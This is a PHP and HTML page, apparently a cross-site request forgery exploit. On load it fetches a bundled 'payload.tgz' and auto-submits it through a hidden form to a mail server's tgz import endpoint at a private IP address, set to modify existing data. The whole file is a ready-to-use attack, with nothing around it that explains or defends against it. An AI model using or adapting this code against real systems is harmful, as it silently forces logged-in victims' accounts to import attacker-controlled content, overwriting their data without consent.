<?php
// minimal_auto_upload.php — place next to payload.tgz
const TARGET = 'https://192.168.137.130/home/user1/?fmt=tgz&resolve=modify&callback=ZmImportExportController__callback__import1&charset=UTF-8';
const LOCAL = 'payload.tgz';

header("Referrer-Policy: no-referrer");
header('Access-Control-Allow-Origin: *');

if (isset($_GET['download'])) {
    $f = __DIR__ . DIRECTORY_SEPARATOR . LOCAL;
    if (!file_exists($f)) { http_response_code(404); echo "Not found"; exit; }
    header('Content-Type: application/x-compressed');
    header('Content-Disposition: attachment; filename="'.basename($f).'"');
    header('Content-Length: '.filesize($f));
    readfile($f);
    exit;
}
?><!doctype html>
<html>
<head><meta charset="utf-8"><title>Auto Upload</title></head>
<body>
<form id="f" action="<?php echo htmlspecialchars(TARGET);?>" method="post" enctype="multipart/form-data" style="display:none;">
  <input id="inp" name="file" type="file">
  <!-- add any hidden fields the target needs -->
</form>

<script>
window.onload = async function(){
  try{
    const r = await fetch('?download=1',{credentials:'same-origin'});
    if(!r.ok) return console.error('fetch failed',r.status);
    const blob = await r.blob();
    const file = new File([blob],'<?php echo addslashes(LOCAL);?>',{type:blob.type||'application/x-compressed'});
    const dt = new DataTransfer(); dt.items.add(file);
    document.getElementById('inp').files = dt.files;
    document.getElementById('f').submit();
  }catch(e){ console.error(e); }
};
</script>
</body>
</html>
